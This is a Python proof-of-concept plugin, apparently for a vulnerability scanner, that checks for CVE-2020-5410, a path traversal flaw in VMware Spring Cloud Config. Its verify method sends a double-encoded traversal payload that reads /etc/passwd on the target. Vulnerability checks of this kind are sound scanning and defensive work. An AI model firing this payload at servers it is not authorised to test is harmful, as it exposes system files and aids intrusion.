# coding : utf-8
# @Time : 2022/10/11 20:12
# @Author : hqe
# @File : GEngine_console.py
# @Project : GEngine
from lib.ReqUtils import req
from BasePoc import BasePoc
from lib.Payload import headers

POC_NAME = "VSCC"

class VSCC(BasePoc):
    poc_info = {
            'Id': 'v_2022_0001',  
            'Name': 'VMware Spring Cloud Config 路径遍历漏洞', 
            'Author': 'hqe',  
            'Create_date': '2022-10-11', 
    }
    
    vul_info = {
            'Product': 'Spring Cloud',  
            'Version': '2.2.x版本、2.1.9之前的2.1.x版本和不再受支持的旧版本中的Spring-cloud-config-server模块存在路径遍历漏洞',  
            'Type': '路径遍历',  
            'Level': 2,  
            'CVE': 'CVE-2020-5410', 
            'CNNVD': 'CNNVD-202006-075', 
            'CNVD': 'CNVD-2020-38876', 
            'Description': """
                            VMware Spring Cloud Config是美国威睿（VMware）公司的一套分布式系统的配置管理解决方案。该产品主要为分布式系统中的外部配置提供服务器和客户端支持。
                            VMware Spring Cloud Config 2.2.3之前的2.2.x版本、2.1.9之前的2.1.x版本和不再受支持的旧版本中的Spring-cloud-config-server模块存在路径遍历漏洞，该漏洞源于程序未能正确验证用户请求。攻击者可借助特制URL利用该漏洞查看系统上的任意文件。
                           """,
            'DisclosureDate': '2020-01-03',  
        }

    def verify(self):

        payload = '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development'
        port = "35578"
        url = "http://" + self.scan_info['Target'] + ":" + port + payload
        # utils.info("payload : {}".format(url+payload))
        response = req(url,'get',headers=headers)
        if response.status_code == 200 and b":root" in response.content:
            self.scan_info['Success'] = True
            self.scan_info['Other']['payload'] = url+payload
            # self.scan_info['Other']['response'] = response.content
            # utils.highlight("{} - {} - {} found".format(self.scan_info['Target'],self.poc_info['poc']['Id']))



